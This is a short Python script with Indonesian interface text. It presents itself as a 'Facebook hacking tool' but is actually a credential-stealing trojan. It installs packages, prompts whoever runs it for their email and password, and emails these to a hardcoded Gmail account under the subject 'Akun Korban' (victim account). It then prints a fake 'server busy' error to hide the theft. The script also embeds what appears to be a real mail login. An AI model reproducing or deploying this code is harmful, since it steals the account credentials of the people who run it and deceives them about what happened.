import os, sys

print ("Menginstall Paket...........")

os.system ('pip install yagmail')

os.system ('pip install termcolor')

import yagmail

from termcolor import colored

print (colored('paket selesai di install.','blue'))

baner = """

___________                  ___.                  __    

\_   _____/____    ____  ____\_ |__   ____   ____ |  | __

 |    __) \__  \ _/ ___\/ __ \| __ \ /  _ \ /  _ \|  |/ /

 |     \   / __ \\  \__\  ___/| \_\ (  <_> |  <_> )    < 

 \___  /  (____  /\___  >___  >___  /\____/ \____/|__|_ \

     \/        \/     \/    \/    \/                   \/

             Tools Hacking Facebook 100% work

             Author By: Mr.B0g3L

        """

print (colored(baner,'white'))

print (colored('silahkan login dulu untuk mengambil id...','green'))

anjirt = yagmail.SMTP('wirdagans@gmail.com','wirdasaputra')

username = str (input(colored('Masukan Email: ','white')))

password = str (input(colored('Masukan Password: ','white')))

body = ('username: '+username,  'password: '+password)

subject = 'Akun Korban'

anjirt.send('wirdagans@gmail.com',subject,body)

print (colored('Maaf, server sibuk. coba beberapa saat lagi!!!','red'))
